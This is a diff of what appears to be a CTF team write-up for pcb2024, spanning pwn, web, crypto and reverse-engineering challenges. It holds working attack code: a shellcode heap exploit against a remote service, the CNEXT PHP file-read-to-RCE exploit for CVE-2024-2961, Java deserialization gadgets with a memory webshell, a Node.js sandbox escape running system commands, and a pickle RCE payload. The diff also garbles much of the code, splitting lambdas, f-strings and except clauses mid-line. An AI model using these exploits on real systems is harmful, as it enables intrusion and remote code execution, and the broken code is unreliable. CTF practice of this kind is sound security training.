@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-Pwn 
+Pwn
 
 cool_book:
 
@@ -40,13 +40,19 @@ sl = lambda data :p.sendline(data)
 sla = lambda text,data :p.sendlineafter(text, data)
 r = lambda num=4096 :p.recv(num)
 rl = lambda text :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter = lambda :p.interactive()
-l32 = lambda :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32 = lambda :u32(p.recv(4).ljust(4,b'x00'))
-uu64 = lambda :u64(p.recv(6).ljust(8,b'x00'))
-int16 = lambda data :int(data,16)
+l32 = lambda :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32 = lambda :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64 = lambda :
+u64(p.recv(6).ljust(8,b'x00'))
+int16 = lambda data :
+int(data,16)
 lg= lambda s, num :p.success('%s -&gt; 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
@@ -92,7 +98,7 @@ s(b'x90'*0x40+asm(sc))
 pr()
 # pause()
 
- Web 
+ Web
 
 LOOKUP
 
@@ -315,7 +321,8 @@ class Remote:
         """Sends given `path` to the HTTP server. Returns the response.
         """
         # print(path)
-        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:123;s:7:"fileput";}}'
+        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:
+123;s:7:"fileput";}}'
         print(path)
         path = base64.encode(path.encode())
         return self.session.get(self.url+"?ser="+path)
@@ -364,7 +371,8 @@ class Exploit:
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
-            except ConnectionError:
+            
+except ConnectionError:
                 failure("Target not [b]reachable[/] ?")
             
 
@@ -374,7 +382,8 @@ class Exploit:
 
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
-        path = f"data:text/plain;base64,{base64}"
+        path = f"data:
+text/plain;base64,{base64}"
         
         result = safe_download(path)
         
@@ -390,7 +399,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(text.encode(), misalign=True).decode()
-        path = f"php://filter//resource=data:text/plain;base64,{base64}"
+        path = f"php://filter//resource=data:
+text/plain;base64,{base64}"
         if not check_token(text, path):
             failure("The [i]php://filter/[/] wrapper does not work")
 
@@ -398,7 +408,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(compress(text.encode()), misalign=True).decode()
-        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
+        path = f"php://filter/zlib.inflate/resource=data:
+text/plain;base64,{base64}"
 
         if not check_token(text, path):
             failure("The [i]zlib[/] extension is not enabled")
@@ -485,7 +496,8 @@ class Exploit:
             if region.permissions == "rw-p"
             and region.size >= HEAP_SIZE
             and region.stop & (HEAP_SIZE-1) == 0
-            and region.path in ("", "[anon:zend_alloc]")
+            and region.path in ("", "[anon:
+zend_alloc]")
         ]
 
         if not heaps:
@@ -715,7 +727,8 @@ class Exploit:
 
         resource = compress(compress(pages))
         resource = b64(resource)
-        resource = f"data:text/plain;base64,{resource.decode()}"
+        resource = f"data:
+text/plain;base64,{resource.decode()}"
 
         filters = [
             # Create buckets
@@ -754,7 +767,8 @@ class Exploit:
 
         try:
             self.remote.send(path)
-        except (ConnectionError, ChunkedEncodingError):
+        
+except (ConnectionError, ChunkedEncodingError):
             pass
         
         msg_print()
@@ -788,7 +802,8 @@ def compressed_bucket(data: bytes) -> bytes:
 def qpe(data: bytes) -> bytes:
     """Emulates quoted-printable-encode.
     """
-    return "".join(f"={x:02x}" for x in data).upper().encode()
+    return "".join(f"={x:
+02x}" for x in data).upper().encode()
 
 def ptr_bucket(*ptrs, size=None) -> bytes:
     """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
@@ -970,7 +985,7 @@ a = base64.b64encode(payload) ##print##(a)
 
 IMG_257
 
- Crypto: 
+ Crypto:
 
 babyenc-pcb2024
 
@@ -984,9 +999,9 @@ n = 16175064088648626038689748434699435826247716579187475966092822028609536761
 c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]
 a=pow(c1[0],e[1])-pow(c1[1],e[0])
 b=pow(c1[2],e[3])-pow(c1[3],e[2])
-<strong>import </strong>gmpy2
+import gmpy2
 n1=gmpy2.gcd(a,b)
-<strong>from </strong>Crypto.Util.number <strong>import </strong>*
+from Crypto.Util.number import *
 b=c2[0]+c2[1]
 c=c2[0]*c2[1]
 R.&lt;x&gt;=Zmod(n)[]
@@ -1546,7 +1561,7 @@ from pwn import *
 from struct import pack
 from ctypes import *
 import base64
-#from LibcSearcher import *
+    #from LibcSearcher import *
 
 context.terminal = ['tmux','splitw','-h']
 def debug(c = 0):
@@ -1563,19 +1578,25 @@ sl = lambda data :p.sendline(data)
 sla = lambda text,data :p.sendlineafter(text, data)
 r = lambda num=4096 :p.recv(num)
 rl = lambda text :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter = lambda :p.interactive()
-l32 = lambda :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32 = lambda :u32(p.recv(4).ljust(4,b'x00'))
-uu64 = lambda :u64(p.recv(6).ljust(8,b'x00'))
-int16 = lambda data :int(data,16)
+l32 = lambda :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32 = lambda :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64 = lambda :
+u64(p.recv(6).ljust(8,b'x00'))
+int16 = lambda data :
+int(data,16)
 lg= lambda s, num :p.success('%s -&gt; 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
 context(os='linux', arch='amd64', log_level='debug')
 
-#p = process('./cool_book')
+    #p = process('./cool_book')
 p=remote('192.168.18.22',8888)
 elf = ELF('./cool_book')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
@@ -1607,18 +1628,13 @@ add(49,asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall'))#heap_b
 
 lg('heap_base',heap_base)
 
-#gdb.attach(p,'b *$rebase(0x12c9)')
+    #gdb.attach(p,'b *$rebase(0x12c9)')
 
 sla(b'3.exitn', b'3')
 sleep(2)
 s(b'x90'*0x40+asm(sc))
 pr()
 # pause()
-```
-
-
-
-```
 package gadget.doubleunser;
 
 import com.fasterxml.jackson.databind.node.POJONode;
@@ -1693,11 +1709,6 @@ Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), ne
 return proxy;
 }
 }
-```
-
-
-
-```
 package gadget.memshell;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
@@ -1778,11 +1789,6 @@ public void transform(DOM document, DTMAxisIterator iterator, Serializatio
 
 }
 }
-```
-
-
-
-```
 #!/usr/bin/env python3
 #
 # CNEXT: PHP file-read to RCE (CVE-2024-2961)
@@ -1836,7 +1842,8 @@ class Remote:
         """Sends given `path` to the HTTP server. Returns the response.
         """
         # print(path)
-        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:123;s:7:"fileput";}}'
+        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:
+123;s:7:"fileput";}}'
         print(path)
         path = base64.encode(path.encode())
         return self.session.get(self.url+"?ser="+path)
@@ -1885,7 +1892,8 @@ class Exploit:
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
-            except ConnectionError:
+            
+except ConnectionError:
                 failure("Target not [b]reachable[/] ?")
             
 
@@ -1895,7 +1903,8 @@ class Exploit:
 
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
-        path = f"data:text/plain;base64,{base64}"
+        path = f"data:
+text/plain;base64,{base64}"
         
         result = safe_download(path)
         
@@ -1911,7 +1920,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(text.encode(), misalign=True).decode()
-        path = f"php://filter//resource=data:text/plain;base64,{base64}"
+        path = f"php://filter//resource=data:
+text/plain;base64,{base64}"
         if not check_token(text, path):
             failure("The [i]php://filter/[/] wrapper does not work")
 
@@ -1919,7 +1929,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(compress(text.encode()), misalign=True).decode()
-        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
+        path = f"php://filter/zlib.inflate/resource=data:
+text/plain;base64,{base64}"
 
         if not check_token(text, path):
             failure("The [i]zlib[/] extension is not enabled")
@@ -2006,7 +2017,8 @@ class Exploit:
             if region.permissions == "rw-p"
             and region.size >= HEAP_SIZE
             and region.stop & (HEAP_SIZE-1) == 0
-            and region.path in ("", "[anon:zend_alloc]")
+            and region.path in ("", "[anon:
+zend_alloc]")
         ]
 
         if not heaps:
@@ -2236,7 +2248,8 @@ class Exploit:
 
         resource = compress(compress(pages))
         resource = b64(resource)
-        resource = f"data:text/plain;base64,{resource.decode()}"
+        resource = f"data:
+text/plain;base64,{resource.decode()}"
 
         filters = [
             # Create buckets
@@ -2275,7 +2288,8 @@ class Exploit:
 
         try:
             self.remote.send(path)
-        except (ConnectionError, ChunkedEncodingError):
+        
+except (ConnectionError, ChunkedEncodingError):
             pass
         
         msg_print()
@@ -2309,7 +2323,8 @@ def compressed_bucket(data: bytes) -> bytes:
 def qpe(data: bytes) -> bytes:
     """Emulates quoted-printable-encode.
     """
-    return "".join(f"={x:02x}" for x in data).upper().encode()
+    return "".join(f"={x:
+02x}" for x in data).upper().encode()
 
 def ptr_bucket(*ptrs, size=None) -> bytes:
     """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
@@ -2351,11 +2366,6 @@ class Region:
         return self.stop - self.start
 
 Exploit()
-```
-
-
-
-```
 import time
 import requests
 import re
@@ -2407,11 +2417,6 @@ print("计算失败，跳过此次提交")
 
 if __name__ == '__main__':
 main()
-```
-
-
-
-```
 POST /login HTTP/1.1
 Host: 192.168.18.21
 Content-Length: 495
@@ -2428,17 +2433,7 @@ Connection: close
 "code":"Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e632822636174202f666c61673e2e2f7075626c69632f6c6f67696e2e6a732229`,`he`.concat(`x`)).toString())"},
 "username":"admin",
 "password":"admin"}
-```
-
-
-
-```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MzExNDMzOTR9.H-ArN4DYdtJmtiTwfdWJ8foll007GeJgMuCmj4tAHkk
-```
-
-
-
-```
 import pickle
 import base64
 
@@ -2450,7 +2445,7 @@ deserialized = pickle.loads(data)nnn return '', 204"
 
 报错回显： raise Exception得到flag
 
-#encoding: utf-8
+    #encoding: utf-8
 
 import os
 
@@ -2471,32 +2466,22 @@ payload=pickle.dumps(a)
 a = base64.b64encode(payload) ##print##(a)
 
 # pickle.loads(payload)
-```
-
-
-
-```
 e = [43, 37, 53, 61, 59]
 c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]
 n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067
 c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]
 a=pow(c1[0],e[1])-pow(c1[1],e[0])
 b=pow(c1[2],e[3])-pow(c1[3],e[2])
-<strong>import </strong>gmpy2
+import gmpy2
 n1=gmpy2.gcd(a,b)
-<strong>from </strong>Crypto.Util.number <strong>import </strong>*
+from Crypto.Util.number import *
 b=c2[0]+c2[1]
 c=c2[0]*c2[1]
 R.&lt;x&gt;=Zmod(n)[]
 f=x^2-b*x+c
 print(f.small_roots(X=2^400))
 print(long_to_bytes(n1&gt;&gt;310)+long_to_bytes(146436625375651639081292195233290471195543268962429))
-#flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}
-```
-
-
-
-```
+    #flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}
 N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033
 e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161
 c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278
@@ -2634,11 +2619,6 @@ print(bytes.fromhex(hex(m)[2:]))
 # 4.64285714285714
 # [{z: 426614979768518060635433317149972303610396098751783498586225631589479798053751568080185868568717967344782297587209012869059719479952019313461850777653567018452929932659204669967695196434044149034271037885062392902287, y: 144996003362760405215910388196517232449311004246441924325936847006315296003811348342536838359, x: 66838488369949543369599279980954380920457752396291961341704448955532596917094831390389571041281062121515985150418852560085}]
 # b'flag{tlp17_1s_4w3s0m3}'
-```
-
-
-
-```
 c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
 n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
 c1 = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317
@@ -2669,11 +2649,6 @@ m = pow(c,d,n)
 print(bytes.fromhex(hex(m)[2:]))
 # 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411
 # b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'
-```
-
-
-
-```
 load("/home/sage/collection_lattice_tools/inequ_cvp_solve.sage")
 
 c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
@@ -2703,17 +2678,12 @@ print(bytes.fromhex(hex(m)[2:]))
 
 # Expected Number of Solutions : 1
 # (124189847121659504689131596141558047777470804493599644420296555116734410602128548952870025238352452050389498094816555251171494633173056599030097009589059426642394227134903947124256903019712657426771434047124620967038284130366066946770546558623405351933778765398347798146994796514331421532950278418230985309907, 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411)
-#b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'
-```
+    #b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'
+    #include <stdio.h>
 
+    #include <stdint.h>
 
-
-```
-#include <stdio.h>
-
-#include <stdint.h>
-
-#include <stdlib.h>
+    #include <stdlib.h>
 
 void encrypt(uint32_t* plainBlock, uint32_t* key) {
 
@@ -2842,11 +2812,6 @@ printf("n%s",cipherData);
 return 0;
 
 }
-```
-
-
-
-```
 import base64
 exp = (每次解密后的得出解密代码)#把前面的”exec(“和后面”)“删掉
 
@@ -2855,11 +2820,6 @@ with open('decoded_output28.txt', 'wb') as f:
 f.write(exp)
 
 print("解密结果已经写入到 decoded_output28.txt 文件中。")
-```
-
-
-
-```
 a=True
 d=len
 G=list
@@ -2920,11 +2880,6 @@ if U==['1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc
 Y('Congratulations! You got the flag!')
 else:
 print('Wrong flag!')
-```
-
-
-
-```
 a = True
 d = len
 G = list
